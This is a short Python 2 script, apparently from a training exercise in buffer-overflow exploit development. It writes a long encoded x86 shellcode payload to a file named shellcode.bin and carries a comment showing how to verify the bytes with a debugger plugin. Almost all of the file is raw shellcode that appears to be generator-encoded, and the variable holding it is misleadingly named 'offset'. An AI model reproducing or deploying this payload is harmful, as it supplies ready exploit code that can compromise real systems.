#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, socket
from struct import *

# !mona compare -f c:\monalogs\trainingserver\shellcode.bin -a 0104EEF9

offset = (
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
"\x81\x76\x0e\x36\xc3\x45\xd7\x83\xee\xfc\xe2\xf4"
"\xca\x2b\xc7\xd7\x36\xc3\x25\x5e\xd3\xf2\x85\xb3"
"\xbd\x93\x75\x5c\x64\xcf\xce\x85\x22\x48\x37\xff"
"\x39\x74\x0f\xf1\x07\x3c\xe9\xeb\x57\xbf\x47\xfb"
"\x16\x02\x8a\xda\x37\x04\xa7\x25\x64\x94\xce\x85"
"\x26\x48\x0f\xeb\xbd\x8f\x54\xaf\xd5\x8b\x44\x06"
"\x67\x48\x1c\xf7\x37\x10\xce\x9e\x2e\x20\x7f\x9e"
"\xbd\xf7\xce\xd6\xe0\xf2\xba\x7b\xf7\x0c\x48\xd6"
"\xf1\xfb\xa5\xa2\xc0\xc0\x38\x2f\x0d\xbe\x61\xa2"
"\xd2\x9b\xce\x8f\x12\xc2\x96\xb1\xbd\xcf\x0e\x5c"
"\x6e\xdf\x44\x04\xbd\xc7\xce\xd6\xe6\x4a\x01\xf3"
"\x12\x98\x1e\xb6\x6f\x99\x14\x28\xd6\x9c\x1a\x8d"
"\xbd\xd1\xae\x5a\x6b\xab\x76\xe5\x36\xc3\x2d\xa0"
"\x45\xf1\x1a\x83\x5e\x8f\x32\xf1\x31\x3c\x90\x6f"
"\xa6\xc2\x45\xd7\x1f\x07\x11\x87\x5e\xea\xc5\xbc"
"\x36\x3c\x90\x87\x66\x93\x15\x97\x66\x83\x15\xbf"
"\xdc\xcc\x9a\x37\xc9\x16\xd2\xbd\x33\xab\x85\x7f"
"\x34\x61\x2d\xd5\x36\xd3\xa4\x5e\xd0\xa9\x55\x81"
"\x61\xab\xdc\x72\x42\xa2\xba\x02\xb3\x03\x31\xdb"
"\xc9\x8d\x4d\xa2\xda\xab\xb5\x62\x94\x95\xba\x02"
"\x5e\xa0\x28\xb3\x36\x4a\xa6\x80\x61\x94\x74\x21"
"\x5c\xd1\x1c\x81\xd4\x3e\x23\x10\x72\xe7\x79\xd6"
"\x37\x4e\x01\xf3\x26\x05\x45\x93\x62\x93\x13\x81"
"\x60\x85\x13\x99\x60\x95\x16\x81\x5e\xba\x89\xe8"
"\xb0\x3c\x90\x5e\xd6\x8d\x13\x91\xc9\xf3\x2d\xdf"
"\xb1\xde\x25\x28\xe3\x78\xb5\x62\x94\x95\x2d\x71"
"\xa3\x7e\xd8\x28\xe3\xff\x43\xab\x3c\x43\xbe\x37"
"\x43\xc6\xfe\x90\x25\xb1\x2a\xbd\x36\x90\xba\x02"
)

f = open("shellcode.bin", "w+")
f.write(offset)
f.close()